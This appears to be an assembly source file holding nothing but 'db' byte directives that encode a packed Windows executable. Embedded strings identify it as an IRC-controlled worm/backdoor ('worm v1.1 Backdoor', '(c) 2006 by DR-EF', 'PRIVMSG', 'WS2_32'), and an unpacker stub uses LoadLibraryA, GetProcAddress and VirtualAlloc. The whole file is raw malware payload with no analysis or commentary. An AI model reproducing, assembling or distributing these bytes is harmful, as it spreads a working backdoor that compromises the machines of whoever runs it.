db 0b7h,021h,037h,05ah,0d0h,053h,0dah,059h,023h,01ah,045h,01bh,075h,005h,01eh
db 0c9h,000h,061h,0f6h,046h,00dh,040h,074h,00fh,040h,010h,017h,04ch,054h,09dh
db 0f7h,0d8h,01bh,0c0h,0a6h,07dh,091h,0b9h,053h,02fh,054h,06fh,094h,0cch,020h
db 0b0h,072h,0e1h,003h,080h,0f9h,032h,0d4h,031h,080h,037h,066h,0a9h,008h,031h
db 050h,01dh,0f1h,098h,03eh,02bh,07eh,026h,057h,038h,08dh,07ch,05fh,050h,0f4h
db 03bh,0c7h,004h,02bh,0e9h,02eh,075h,00eh,0a8h,08eh,081h,00ch,034h,024h,0fdh
db 0ebh,05eh,0b8h,0d6h,050h,04eh,00ch,0cbh,0ffh,084h,0cah,048h,014h,089h,006h
db 05fh,0d5h,01eh,0a6h,099h,02eh,03bh,093h,063h,008h,066h,055h,048h,057h,033h
db 0f6h,0ffh,050h,078h,0e7h,0f9h,04dh,038h,08bh,048h,012h,0fbh,006h,05fh,030h
db 044h,053h,0a1h,0a9h,082h,01dh,012h,066h,00fh,053h,03ah,01dh,043h,0ebh,01ah
db 0e6h,009h,04dh,0d5h,03bh,0ech,044h,078h,002h,028h,061h,006h,04eh,075h,002h
db 00bh,0f8h,0b3h,00ch,0f0h,01ah,0beh,074h,002h,03eh,057h,048h,0cbh,021h,04eh
db 09bh,00dh,057h,083h,0cfh,040h,000h,027h,0ech,01fh,0ebh,03ah,0a8h,034h,00bh
db 0efh,03ch,0cdh,0f8h,00fh,03fh,023h,01eh,057h,054h,056h,0a1h,0e2h,0bbh,050h
db 04ch,07dh,005h,0ebh,012h,04eh,046h,01bh,0f1h,01ch,00bh,064h,0c3h,0ceh,074h
db 023h,02dh,0ebh,08ah,01ch,0f1h,0e8h,01ah,08ch,00ch,000h,03dh,01ah,0cah,006h
db 0c2h,08bh,0d0h,0e2h,01fh,006h,0c2h,059h,0eah,0d1h,074h,025h,099h,0f9h,02ah
db 0a6h,059h,0a4h,0edh,065h,0beh,006h,0ach,01dh,006h,0b1h,012h,0a3h,082h,0a1h
db 0cch,025h,050h,075h,046h,044h,0e4h,060h,014h,06ch,018h,0fah,092h,075h,079h
db 0cfh,018h,065h,01ch,054h,0afh,0cah,03ah,01ch,003h,066h,00fh,06bh,0c0h,057h
db 09ch,062h,069h,07ch,07dh,010h,0c0h,0edh,000h,021h,0f0h,056h,09ch,0a8h,020h
db 056h,004h,065h,044h,074h,057h,051h,03eh,04ah,07ch,07fh,07ah,09ch,0abh,01ah
db 0c1h,026h,0f9h,058h,0abh,0ech,061h,0fch,08bh,07dh,00eh,0c5h,053h,014h,086h
db 0e7h,0ech,0fbh,058h,052h,0a0h,05fh,0fch,02bh,04dh,00ch,02dh,0a1h,0cah,072h
db 029h,035h,071h,04ch,0a9h,009h,00ah,0f2h,029h,048h,00eh,0f0h,0c6h,000h,074h
db 041h,033h,021h,088h,0c8h,08dh,095h,04ah,051h,096h,0a1h,02bh,0cah,09fh,063h
db 045h,0ddh,0cch,055h,001h,0c7h,0bch,040h,0dch,0dch,0b8h,057h,09ch,049h,0f9h
db 036h,05ch,02ch,015h,0e4h,0c9h,043h,0f4h,001h,00bh,0b8h,084h,060h,0c7h,07ch
db 073h,092h,072h,090h,045h,034h,02dh,0f2h,00dh,08ah,08bh,043h,0e9h,05ch,014h
db 00fh,085h,08bh,0dbh,042h,003h,034h,05fh,06ah,005h,058h,039h,045h,0edh,0c8h
db 079h,023h,0c5h,08ah,0a6h,06dh,099h,036h,002h,0bch,0c5h,089h,0ebh,0c7h,08dh
db 04dh,0f4h,0b9h,05ch,02fh,0cah,0deh,068h,07bh,01ch,00bh,030h,08eh,05dh,010h
db 0f8h,0ebh,0a7h,09ch,0a1h,0a3h,0cdh,01ah,0c6h,016h,00dh,014h,03dh,0d0h,018h
db 0cch,068h,00ch,080h,038h,0cah,011h,08ch,060h,0cdh,03bh,0f1h,078h,05dh,01ch
db 089h,03dh,001h,0e3h,0dbh,010h,0ebh,016h,0f0h,07fh,088h,0b9h,09fh,062h,020h
db 04ch,05ah,014h,03bh,03dh,0bah,044h,05ah,030h,071h,095h,043h,090h,0c7h,08bh
db 0f7h,0f6h,02eh,004h,068h,0ech,069h,057h,0bah,0ach,081h,055h,074h,03ch,083h
db 0ffh,001h,026h,00ah,060h,089h,016h,005h,089h,075h,0f2h,09eh,011h,009h,0d2h
db 0e8h,0e8h,0fch,079h,05dh,07ch,00bh,059h,03bh,0c5h,01ch,035h,044h,0c4h,08fh
db 064h,0feh,018h,0f2h,074h,0c0h,026h,0ebh,096h,0edh,07ah,059h,0d1h,09dh,0deh
db 085h,0edh,050h,07eh,00ch,08bh,055h,015h,03dh,0a8h,0dch,0ddh,0a6h,074h,012h
db 03bh,084h,0b9h,0a2h,019h,0a8h,019h,026h,069h,0a4h,01eh,060h,00dh,002h,0b7h
db 066h,081h,0f7h,0fbh,0b6h,085h,084h,0beh,059h,00eh,042h,0bbh,054h,046h,004h
db 080h,0ebh,04eh,010h,0ffh,025h,0a8h,000h,000h,0fch,0eeh,058h,02dh,077h,06fh
db 072h,06dh,020h,076h,031h,02eh,031h,020h,042h,061h,063h,06bh,064h,001h,000h
db 0c0h,059h,06fh,020h,028h,063h,029h,020h,032h,030h,030h,036h,020h,062h,079h
db 020h,044h,052h,02dh,045h,046h,080h,0b6h,020h,05fh,057h,069h,068h,077h,073h
db 055h,070h,040h,04bh,064h,008h,064h,061h,074h,065h,05ch,000h,049h,00bh,07eh
db 06eh,074h,02eh,065h,078h,000h,069h,072h,063h,02eh,075h,0cbh,0b4h,040h,0b5h
db 065h,072h,06eh,065h,059h,068h,05ah,018h,067h,061h,076h,0b3h,090h,04dh,0c0h
db 073h,02dh,073h,075h,073h,021h,027h,078h,027h,0d0h,023h,078h,077h,030h,07ah
db 000h,078h,0f8h,000h,027h,0bbh,05fh,05fh,0ffh,000h,043h,023h,0b0h,027h,01ch
db 000h,000h,0c0h,0e1h,05fh,05fh,047h,04ch,04fh,042h,041h,04ch,05fh,048h,045h
db 041h,050h,05fh,053h,045h,04ch,045h,043h,054h,045h,0c0h,023h,079h,02dh,044h
db 000h,04dh,09ah,096h,0beh,016h,043h,052h,054h,020h,0adh,0a1h,027h,072h,06dh
db 065h,02eh,0bfh,091h,04eh,020h,072h,060h,062h,058h,078h,00dh,00ah,054h,0e4h
db 09ch,0a3h,085h,053h,053h,039h,00bh,0beh,0c1h,049h,04eh,047h,045h,047h,05ah
db 0e0h,000h,044h,04fh,04dh,041h,032h,001h,059h,0c0h,052h,036h,030h,032h,038h
db 02dh,020h,002h,01ch,0c1h,0c1h,061h,062h,06ch,074h,06fh,020h,069h,081h,066h
db 001h,06bh,061h,06ch,069h,07ah,068h,065h,061h,070h,01dh,09dh,0e7h,07bh,037h
db 000h,071h,0fah,005h,06eh,06fh,074h,075h,067h,068h,020h,089h,0f1h,0e0h,033h
db 073h,070h,066h,05fh,044h,033h,0f7h,06ch,069h,0bdh,060h,02ch,00fh,061h,06fh
db 06eh,0f7h,061h,07dh,0dch,036h,073h,074h,064h,02bh,0d6h,005h,09dh,035h,070h
db 075h,072h,076h,0e6h,013h,02eh,088h,074h,075h,0a1h,071h,051h,04eh,063h,020h
db 063h,0bch,0a1h,00bh,066h,06ch,0cbh,0fah,09bh,0e8h,034h,05fh,0dch,032h,0aeh
db 0a8h,0d6h,0b8h,0fbh,010h,02fh,05bh,012h,037h,0dch,0e0h,0efh,011h,0ebh,031h
db 039h,06fh,070h,065h,02ch,0c4h,017h,09bh,073h,06fh,0e6h,0a5h,019h,0fah,02ch
db 09fh,0b7h,02eh,063h,038h,010h,04ch,0c8h,063h,065h,064h,07dh,0cdh,096h,0cdh
db 00dh,0ffh,068h,03ch,037h,06dh,075h,06ch,033h,0fch,01bh,0d8h,074h,068h,061h
db 064h,0efh,049h,0c6h,086h,0cfh,07dh,08dh,054h,05dh,0ceh,053h,0a7h,061h,047h
db 09ch,008h,0d7h,018h,0a9h,0c7h,084h,070h,001h,060h,012h,070h,067h,072h,061h
db 06dh,062h,0cfh,050h,016h,06dh,07eh,026h,0fch,03bh,030h,039h,01bh,0cch,040h
db 0b7h,077h,071h,02ch,0d4h,06dh,074h,064h,07dh,0b4h,05eh,038h,061h,045h,0e8h
db 002h,018h,075h,073h,007h,09ch,0a9h,06fh,05dh,082h,011h,0adh,066h,08ah,085h
db 0b0h,0d1h,06eh,067h,06fh,0d1h,0e8h,0a6h,02fh,074h,033h,0feh,027h,0cch,064h
db 04dh,0f9h,008h,0b8h,0b4h,0d4h,021h,0a8h,016h,066h,056h,069h,073h,00dh,007h
db 0d7h,080h,043h,02bh,02bh,020h,052h,04ch,069h,062h,02eh,03ah,017h,0e8h,072h
db 079h,00ah,033h,0a3h,0ach,0dbh,045h,0d4h,088h,068h,091h,021h,050h,000h,096h
db 0dfh,0c2h,03ah,020h,02eh,000h,080h,09bh,02ah,047h,03ch,03bh,0c1h,0deh,0f2h
db 06bh,037h,08ah,06dh,001h,077h,06eh,03eh,047h,098h,042h,09eh,082h,04ch,061h
db 041h,01dh,0a2h,01bh,056h,050h,03fh,0b7h,069h,0c1h,075h,070h,08eh,0c9h,0d7h
db 028h,040h,039h,003h,000h,065h,073h,073h,061h,067h,065h,042h,06fh,078h,041h
db 000h,075h,073h,033h,032h,02eh,064h,005h,083h,051h,0a7h,0e1h,0d0h,03bh,0cch
db 0d0h,056h,0d4h,056h,0e8h,039h,06bh,043h,06ah,00eh,02dh,0e7h,070h,05ah,06eh
db 05ah,01eh,05bh,00bh,037h,02fh,01ch,022h,05bh,000h,076h,066h,078h,0deh,0b4h
db 038h,020h,010h,070h,0f8h,079h,0dch,0e1h,078h,080h,008h,071h,0f0h,075h,0bch
db 000h,0e7h,071h,0c7h,073h,014h,077h,0cah,024h,046h,0c3h,0e1h,08eh,000h,077h
db 024h,079h,010h,071h,087h,0c3h,0e1h,0abh,09ah,078h,08ch,078h,0ach,078h,038h
db 01ch,0efh,0c5h,078h,088h,077h,096h,077h,0a4h,087h,0c3h,0e1h,070h,077h,0b0h
db 077h,0c0h,077h,0d2h,077h,0e2h,077h,0e7h,079h,01ch,00eh,0eeh,077h,070h,077h
db 004h,010h,020h,070h,038h,01ch,08eh,02eh,078h,03ah,078h,050h,078h,0d6h,07bh
db 0c4h,07bh,0f1h,03ch,0cfh,0e3h,062h,056h,0f8h,048h,0b4h,07bh,01ch,00eh,087h
db 0c3h,0a4h,07bh,098h,07bh,088h,07bh,076h,07bh,0cfh,0e3h,070h,038h,064h,07bh
db 054h,07bh,042h,07bh,034h,024h,0e1h,070h,038h,01ch,018h,07bh,00ch,07bh,002h
db 07bh,0f6h,07ah,0e0h,07ah,038h,01ch,08eh,0c7h,0e6h,0d4h,07ah,030h,079h,044h
db 079h,056h,087h,0c3h,0e1h,070h,079h,068h,079h,076h,079h,084h,079h,098h,079h
db 071h,038h,01ch,00eh,0ach,079h,0c8h,079h,0e2h,079h,0fch,079h,012h,038h,01ch
db 08fh,0e3h,02ah,07ah,044h,056h,07ah,066h,07ah,074h,087h,0c3h,0e1h,070h,07ah
db 08eh,07ah,09eh,07ah,0ach,07ah,0bah,07ah,07fh,0c4h,0f7h,008h,0c8h,07ah,074h
db 096h,096h,0c5h,0f1h,0d6h,078h,0ech,041h,079h,05ah,01ch,014h,079h,0f3h,01ch
db 016h,0dah,080h,073h,017h,034h,0cfh,0f3h,03ch,0cfh,009h,00bh,014h,003h,074h
db 034h,0dfh,0f3h,03ch,010h,013h,00ah,09eh,031h,0eeh,01ah,01bh,000h,043h,0ddh
db 024h,0e5h,014h,048h,061h,02ch,0c8h,026h,001h,000h,0dfh,002h,057h,072h,065h
db 046h,069h,076h,014h,0c1h,0bah,043h,038h,057h,0cch,05ch,041h,002h,081h,018h
db 0c3h,058h,053h,065h,06dh,001h,0a0h,006h,099h,02dh,054h,06bh,0c5h,07fh,0dbh
db 035h,043h,06fh,081h,01ah,0c4h,07fh,09eh,062h,0a3h,04dh,0a6h,0e1h,041h,06ch
db 0e6h,0e2h,0d8h,054h,065h,06ah,00dh,06ah,03eh,0f9h,002h,06ch,00ch,0cbh,030h
db 09ah,0c1h,0eeh,005h,0e5h,000h,065h,065h,06dh,070h,050h,012h,03eh,00bh,067h
db 068h,09fh,002h,054h,0a3h,0a6h,071h,075h,065h,054h,0ddh,0b9h,0bfh,013h,000h
db 04ah,063h,0fdh,022h,09bh,003h,070h,079h,026h,0d3h,018h,0c4h,0d3h,002h,045h
db 0a7h,089h,070h,0a9h,0fch,097h,0d5h,039h,096h,008h,0cbh,022h,05dh,00bh,06eh
db 034h,010h,0efh,097h,03fh,04dh,075h,0f6h,02ah,07ch,0aeh,0edh,001h,04fh,0d1h
db 02dh,0aah,0b9h,028h,06fh,08dh,0abh,009h,032h,059h,04ch,0f2h,085h,092h,053h
db 079h,039h,0c8h,0bch,0c0h,044h,069h,08ah,0cbh,03ah,00ch,0dah,02ah,0a8h,05ah
db 024h,04dh,06fh,064h,0e1h,028h,0e3h,027h,04eh,0d6h,064h,0f0h,0beh,04bh,045h
db 052h,04eh,045h,050h,0ebh,020h,0ach,002h,077h,096h,0e5h,034h,09ch,072h,066h
db 0a0h,0aeh,073h,0d0h,055h,053h,05bh,001h,052h,065h,088h,019h,02bh,065h,067h
db 04bh,065h,030h,013h,035h,00bh,086h,053h,0eah,027h,0a0h,066h,056h,075h,065h
db 045h,0c9h,099h,014h,02dh,072h,02ah,008h,0bah,0deh,041h,044h,056h,040h,0f5h
db 08bh,077h,049h,057h,053h,032h,05fh,074h,013h,0d4h,0b2h,056h,000h,049h,0abh
db 0d5h,0deh,085h,09bh,059h,0d5h,0a2h,077h,052h,069h,031h,06eh,035h,000h,071h
db 031h,023h,06ch,0adh,055h,07bh,05ah,09eh,04bh,06fh,003h,02dh,004h,074h,057h
db 091h,069h,013h,082h,045h,054h,026h,09eh,0abh,0e5h,0beh,083h,02dh,099h,0f9h
db 050h,02fh,087h,089h,028h,070h,0a4h,033h,0aeh,092h,0eah,048h,0f7h,022h,0cah
db 041h,047h,08ah,00bh,06dh,06dh,04ch,025h,01ah,097h,0e4h,074h,056h,06fh,034h
db 098h,079h,0d9h,077h,022h,088h,07dh,000h,045h,0a9h,0b3h,0cch,06bh,063h,073h
db 0c3h,090h,06fh,05bh,030h,0a1h,0a4h,000h,0f7h,002h,09bh,0d9h,026h,06eh,0d1h
db 013h,058h,0e7h,0adh,002h,055h,06eh,068h,012h,0d1h,0f1h,097h,064h,070h,0d3h
db 062h,053h,037h,0eah,082h,0f7h,0aah,0b2h,000h,046h,08eh,0a1h,098h,023h,086h
db 033h,0cfh,0e4h,0a9h,05fh,0b6h,038h,067h,073h,0b3h,060h,09bh,029h,0c6h,0d2h
db 00ch,048h,013h,0e0h,043h,072h,054h,06fh,04dh,061h,050h,068h,099h,042h,079h
db 0e5h,09eh,0d2h,08dh,006h,077h,09dh,072h,0cch,058h,0d6h,018h,0cbh,002h,0b9h
db 019h,035h,087h,08eh,066h,0deh,0ach,052h,03dh,08bh,0e3h,02bh,064h,000h,015h
db 09ch,005h,0c1h,033h,054h,079h,070h,080h,0cdh,04fh,026h,009h,056h,00dh,026h
db 072h,031h,069h,087h,05eh,039h,01ah,0f4h,058h,00ch,00ah,09dh,001h,048h,0a5h
db 0b7h,064h,019h,06fh,0d2h,09ah,045h,034h,09bh,012h,04ch,0cbh,0dfh,0bfh,002h
db 056h,024h,06fh,05bh,0bdh,0b9h,06dh,0e7h,018h,007h,075h,006h,04ch,000h,02fh
db 002h,052h,074h,06ch,077h,069h,0b9h,0adh,06ch,004h,000h,0e4h,001h,0ech,0a7h
db 0dch,00dh,0b1h,043h,0d6h,0cdh,050h,0cch,06dh,01ch,00dh,000h,0b9h,0a0h,07eh
db 0e2h,03eh,031h,04fh,045h,04dh,0dah,033h,0d1h,0b2h,099h,095h,04eh,0dch,08ch
db 0bbh,06dh,05bh,0d8h,039h,000h,0a2h,08bh,09dh,033h,04ch,03eh,002h,089h,02bh
db 0d5h,041h,064h,064h,072h,07ch,02ah,06ch,01fh,0c2h,001h,04ch,01bh,03bh,035h
db 0d9h,026h,077h,0e4h,0f3h,053h,0feh,08ch,04eh,0ffh,056h,0f5h,013h,0e9h,038h
db 057h,01ah,03ch,037h,07ah,032h,067h,0e2h,0c6h,035h,018h,002h,0bfh,0f9h,03dh
db 0f0h,084h,043h,04dh,09fh,07eh,096h,0fdh,0c0h,0eah,0e9h,05fh,0b9h,06ah,0c6h
db 0a4h,02fh,046h,050h,03fh,013h,02dh,06ah,07ch,0c3h,00ch,053h,0f6h,0aah,00ah
db 034h,02eh,010h,073h,068h,042h,075h,066h,066h,068h,06dh,0b4h,0e0h,0fch,058h
db 007h,0cfh,054h,03dh,0c6h,060h,040h,06bh,061h,058h,056h,0d6h,092h,078h,07bh
db 0cah,039h,00ah,000h,05dh,092h,0dch,097h,03ah,0cfh,0c0h,020h,06ch,031h,02eh
db 060h,014h,000h,068h,050h,052h,049h,056h,04dh,053h,047h,020h,025h,073h,020h
db 03ah,0e5h,064h,00ch,0cch,072h,0ech,0d3h,03ch,093h,0cah,082h,09ch,095h,02dh
db 021h,073h,0eah,023h,0feh,0bch,057h,035h,020h,0fbh,095h,025h,018h,02dh,0c7h
db 09bh,077h,065h,05fh,0b1h,087h,00ch,046h,062h,077h,0fch,06bh,059h,057h,055h
db 08eh,051h,0a6h,011h,064h,070h,020h,0a1h,05ah,0fch,07ch,075h,05fh,066h,0dbh
db 0ebh,0b1h,0ceh,090h,070h,035h,087h,044h,0d4h,082h,0cch,019h,026h,00dh,088h
db 033h,010h,063h,067h,072h,041h,07eh,031h,0b4h,05ch,05ch,0ech,064h,05fh,066h
db 0c8h,0afh,02bh,0e0h,04fh,0cch,089h,067h,075h,063h,0fbh,027h,015h,093h,0a8h
db 0f1h,014h,02dh,06ch,000h,094h,071h,03ah,017h,025h,02ah,073h,0a4h,02ch,020h
db 0e1h,000h,04dh,04fh,044h,045h,00ah,0dch,0c0h,047h,02bh,06bh,0ech,01dh,063h
db 019h,04ah,04fh,030h,04ch,0f0h,0beh,030h,030h,031h,04fh,04eh,0b2h,020h,00ah
db 05ah,047h,050h,0dah,045h,090h,0e5h,03ah,037h,090h,09ah,016h,043h,04bh,0dah
db 082h,0e6h,0d3h,038h,020h,02ah,0c6h,0d0h,07ch,03ah,053h,058h,0a7h,074h,023h
db 05ch,08bh,052h,0d4h,0d0h,0f6h,078h,091h,0d7h,05ch,0c9h,0d0h,05ch,018h,05ch
db 08ah,0c3h,0f2h,03dh,001h,0cah,028h,063h,081h,0a1h,013h,020h,009h,02dh,00dh
db 05dh,096h,0fch,06fh,0cch,05dh,005h,0c2h,039h,0b4h,0b4h,00bh,01dh,0c0h,004h
db 0e7h,079h,0e7h,0cbh,096h,08dh,008h,077h,0deh,079h,0e7h,08eh,08fh,090h,0deh
db 079h,0e7h,09dh,091h,092h,093h,034h,0cfh,0f3h,058h,003h,007h,00ah,08ch,08dh
db 098h,0f3h,03bh,010h,0eah,058h,083h,0d6h,005h,093h,019h,056h,00dh,00dh,09bh
db 080h,074h,0e7h,079h,02ch,05bh,054h,009h,028h,08fh,0e3h,079h,09eh,00ah,004h
db 010h,0d8h,073h,011h,03ch,0cfh,0f3h,03ch,0a8h,012h,084h,013h,058h,018h,079h
db 01ch,0cfh,0f3h,020h,019h,0f8h,072h,01ah,0c0h,0edh,079h,09eh,0e7h,01bh,088h
db 01ch,060h,09eh,0c7h,022h,06eh,050h,079h,0b1h,0b4h,057h,07bh,040h,030h,0eeh
db 079h,09eh,0e7h,0fch,02ch,0ffh,01ch,076h,0c3h,082h,002h,0ceh,055h,040h,00fh
db 043h,0b4h,0cfh,02eh,060h,0d2h,070h,08eh,07eh,083h,059h,067h,015h,0dch,028h
db 020h,09ch,073h,0e4h,0d5h,048h,07dh,05eh,067h,01fh,084h,010h,09dh,05fh,0e7h
db 09dh,081h,001h,010h,0e7h,0d7h,079h,0e7h,082h,002h,010h,055h,0c1h,0a3h,0e6h
db 020h,007h,04ah,03ah,070h,001h,002h,004h,008h,0e3h,0d0h,00ch,044h,060h,082h
db 079h,082h,021h,0a6h,0dfh,007h,03ah,0f0h,0e1h,0a1h,0a5h,081h,09fh,0e0h,0fch
db 040h,07eh,080h,0fch,0c7h,0efh,080h,043h,0a8h,003h,0c1h,0a3h,0dah,0a3h,020h
db 081h,0feh,05fh,0efh,0e2h,0c3h,040h,0feh,0b5h,035h,00ch,09eh,09fh,041h,0b6h
db 0cfh,0a2h,0e4h,0a2h,0d6h,0aah,05eh,0c0h,0e5h,0a2h,0e8h,0a2h,05bh,0c0h,0a1h
db 0c3h,0fah,07eh,0a1h,0feh,051h,005h,051h,0dah,05eh,0dah,038h,0e0h,03ah,0e0h
db 05fh,0dah,06ah,0dah,032h,0d3h,0d8h,0deh,0e0h,0f9h,031h,033h,071h,02ah,05fh
db 07eh,036h,01ch,066h,048h,0b6h,01ch,058h,07eh,098h,0ffh,0f0h,055h,055h,0c0h
db 0e2h,0f1h,000h,0bah,02dh,032h,057h,001h,0a7h,099h,0a8h,0b0h,03ch,052h,06eh
db 016h,002h,0cfh,0f3h,063h,0f9h,003h,004h,018h,001h,0c9h,0f3h,03ch,005h,00dh
db 006h,009h,058h,00eh,08bh,0a7h,00ch,008h,0f9h,0b6h,0fch,0fch,009h,00ah,00bh
db 0f2h,07ch,05fh,0deh,016h,016h,00fh,0e7h,0d3h,0f2h,06bh,010h,011h,0b5h,03ch
db 01fh,096h,012h,002h,021h,0f3h,0f3h,067h,0f9h,035h,041h,043h,0afh,0e5h,0f3h
db 0f2h,050h,052h,07fh,093h,01fh,0cbh,053h,057h,0bfh,096h,0efh,093h,059h,06ch
db 0cdh,09ah,0a8h,03ch,06dh,020h,0bah,0d1h,03eh,040h,072h,079h,0f3h,077h,0f9h
db 006h,080h,0bfh,0e5h,0c7h,0f2h,081h,082h,0cfh,08fh,0c9h,0cfh,083h,084h,091h
db 0b3h,0f9h,0b3h,03ch,029h,09eh,0a1h,0f9h,0f9h,03bh,0f9h,0a4h,0a7h,0b7h,0f3h
db 06fh,0f9h,0b7h,0ceh,0d7h,02bh,0f8h,09bh,0f1h,018h,007h,0a0h,0cch,040h,0afh
db 0e8h,0b8h,0c1h,001h,0e0h,042h,0a3h,0f7h,0c4h,0d3h,07fh,02bh,0adh,02bh,037h
db 070h,000h,000h,000h,0a0h,000h,000h,000h,04ch,0f0h,000h,000h,05ch,0f0h,000h
db 000h,070h,0f0h,000h,000h,080h,0f0h,000h,000h,000h,000h,000h,000h,000h,0f0h
db 000h,000h,000h,000h,000h,000h,0ffh,0ffh,0ffh,0ffh,03ch,0f0h,000h,000h,000h
db 0f0h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,06bh,065h,072h,06eh,065h,06ch,033h
db 032h,02eh,064h,06ch,06ch,000h,000h,000h,000h,000h,000h,04ch,06fh,061h,064h
db 04ch,069h,062h,072h,061h,072h,079h,041h,000h,000h,000h,000h,047h,065h,074h
db 050h,072h,06fh,063h,041h,064h,064h,072h,065h,073h,073h,000h,000h,000h,000h
db 000h,000h,056h,069h,072h,074h,075h,061h,06ch,041h,06ch,06ch,06fh,063h,000h
db 000h,000h,000h,056h,069h,072h,074h,075h,061h,06ch,046h,072h,065h,065h,000h
db 000h,04eh,075h,0e8h,032h,0d2h,0ebh,0b4h,054h,0deh,002h,0c2h,0c8h,08ah,0d0h
db 08bh,0c1h,088h,02dh,0a9h,027h,0ebh,09bh,001h,004h,066h,045h,0c4h,0f4h,003h
db 072h,0e8h,0bfh,0d2h,09eh,04dh,000h,000h,0bch,00bh,000h,000h,008h,000h,000h
db 018h,058h,000h,060h,08bh,074h,024h,024h,08bh,07ch,024h,028h,0fch,0adh,033h
db 0c9h,085h,0c0h,074h,011h,0e0h,000h,01ch,000h,033h,0d2h,08dh,01ch,038h,0a4h
db 0b1h,003h,0e8h,072h,000h,073h,0f6h,03bh,0fbh,00fh,083h,085h,000h,053h,055h
db 057h,008h,05ch,000h,000h,033h,0dbh,043h,033h,0edh,08bh,0c3h,08dh,07ch,01dh
db 000h,08bh,0ebh,08bh,0dfh,0e8h,051h,0f1h,000h,0e4h,02ch,000h,08dh,05ch,03dh
db 000h,003h,0c7h,08bh,0efh,0e8h,042h,0e2h,05fh,05dh,05bh,02bh,0c1h,073h,009h
db 020h,0b2h,000h,00eh,08bh,0c5h,0e8h,03dh,000h,0ebh,024h,0b1h,006h,0e8h,029h
db 013h,0c0h,049h,075h,021h,05bh,0a6h,02ch,0f6h,040h,08bh,001h,080h,0ech,058h
db 000h,063h,083h,0d9h,0ffh,03dh,081h,007h,056h,060h,02ch,000h,000h,08bh,0f7h
db 02bh,0f0h,0f3h,0a4h,05eh,041h,041h,0ebh,089h,003h,0d2h,075h,006h,092h,0adh
db 092h,042h,0c3h,000h,058h,0e0h,0d9h,041h,0e8h,0edh,0ffh,013h,0c9h,0e8h,058h
db 09eh,01bh,038h,0e6h,0ffh,072h,0f2h,0c3h,02bh,089h,016h,0b4h,06fh,060h,01ch
db 061h,0c2h,00ch,050h,000h,001h,058h,0d8h,0b0h,02ch,040h,050h,01bh,000h,0b3h
db 0b0h,02ch,01eh,0f0h,004h,0f0h,0f8h,070h,038h,0dch,0eah,09bh,0c4h,000h,078h
db 075h,004h,01dh,0e7h,0d3h,0bfh,08fh,0f0h,003h,01ch,00eh,0e7h,080h,081h,073h
db 069h,028h,074h,05eh,012h,000h,002h,000h,0b2h,0d0h,04fh,080h,059h,048h,096h
db 07ch,012h,032h,000h,070h,06dh,00bh,0c3h,0c2h,089h,067h,0f8h,00bh,01ch,01ah
db 0ceh,079h,010h,0fdh,03fh,0e9h,063h,0aah,02ch,0eah,08bh,0cch,0d1h,0e2h,0dbh
db 083h,057h,08fh,0b2h,000h,0f7h,007h,003h,08dh,02eh,0deh,0c3h,00bh,074h,0adh
db 0b8h,0c0h,057h,056h,055h,0e8h,001h,06bh,002h,061h,05dh,081h,0edh,030h,010h
db 08dh,0b5h,027h,0a0h,066h,0c0h,062h,08bh,046h,0fch,083h,0c0h,004h,08bh,06bh
db 001h,0a0h,02ch,056h,008h,01ch,003h,0c2h,08bh,008h,089h,08dh,04ah,01bh,067h
db 0c7h,0cch,0a2h,020h,04eh,024h,080h,0c7h,067h,0c7h,052h,028h,056h,0fch,08bh
db 0deh,083h,07bh,048h,000h,0c1h,009h,000h,001h,074h,015h,08bh,073h,044h,085h
db 0f6h,074h,00eh,0b9h,023h,003h,0f2h,08bh,07bh,040h,003h,0fah,02ch,017h,070h
db 0aeh,08bh,0f3h,08dh,0bdh,03ah,001h,059h,081h,0b2h,000h,02fh,001h,06fh,004h
db 08dh,08dh,019h,01ah,051h,0e8h,026h,03eh,0e1h,0c0h,052h,090h,08bh,04eh,02ch
db 0d9h,04ch,06ch,00bh,056h,046h,06fh,028h,018h,0e1h,06ah,040h,068h,051h,06ah
db 087h,018h,02dh,020h,012h,089h,085h,042h,056h,0e8h,0dah,031h,0d0h,039h,042h
db 073h,0b1h,009h,00fh,085h,0a6h,0d7h,002h,07ah,0c2h,044h,0c5h,0dfh,0fah,009h
db 050h,0c8h,034h,085h,0c9h,00fh,084h,089h,0d9h,00bh,0e2h,082h,04eh,008h,051h
db 038h,005h,062h,071h,0deh,000h,074h,07bh,08bh,095h,09ah,018h,08dh,09eh,0a3h
db 0d8h,010h,0deh,075h,008h,0c1h,001h,0c5h,0cah,0c1h,0ebh,02dh,0f7h,0c1h,074h
db 01eh,052h,081h,0e1h,0bch,016h,018h,08fh,07fh,051h,08dh,085h,08eh,050h,0e5h
db 0c2h,083h,0b1h,05ah,01bh,0ffh,095h,0d7h,09dh,082h,075h,044h,01dh,008h,003h
db 0c8h,058h,09dh,0deh,082h,052h,059h,06ah,010h,0f4h,0aah,085h,0b3h,043h,016h
db 05dh,08bh,0f5h,095h,0d3h,001h,08dh,084h,0ceh,038h,02ah,01ah,000h,000h,0a6h
db 075h,016h,08bh,043h,00ch,08bh,04bh,040h,08bh,0f1h,003h,073h,008h,0c6h,006h
db 0e9h,083h,0c1h,005h,099h,06dh,006h,0f6h,089h,046h,001h,029h,07ch,013h,091h
db 08bh,07eh,0c7h,068h,01eh,0c9h,09fh,09ah,0b5h,069h,0f9h,0adh,008h,0ffh,00ch
db 0f5h,01eh,002h,080h,05dh,05eh,05fh,05bh,0c3h,055h,08bh,0ech,083h,0c4h,0fch
db 08ch,038h,030h,07bh,05bh,081h,0ebh,0e7h,013h,08bh,090h,039h,004h,030h,08bh
db 00eh,003h,0cbh,051h,0ffh,093h,089h,045h,0c8h,098h,000h,056h,0fch,004h,0d3h
db 00bh,0e2h,006h,000h,003h,0fbh,033h,0c0h,003h,002h,074h,016h,052h,08bh,002h
db 003h,0c3h,075h,0fch,0b7h,000h,078h,084h,04eh,0abh,05ah,083h,0c2h,004h,0ebh
db 0e4h,083h,0c6h,00ch,086h,085h,062h,0a1h,006h,075h,0c3h,0ebh,003h,0cch,0b5h
db 0fch,026h,048h,0c9h,0edh,01eh,038h,0c5h,06ch,0abh,02dh,0b6h,021h,080h,046h
db 098h,066h,08bh,04dh,055h,00ch,0adh,003h,0b0h,04bh,0d3h,0c2h,066h,089h,008h
db 0ebh,0f4h,086h,01eh,036h,06ch,093h,0cbh,065h,0fbh,0f8h,086h,080h,0a3h,0b8h
db 088h,0c8h,035h,0a8h,03ch,074h,00ah,0feh,0e1h,0feh,006h,0c9h,050h,0ebh,007h
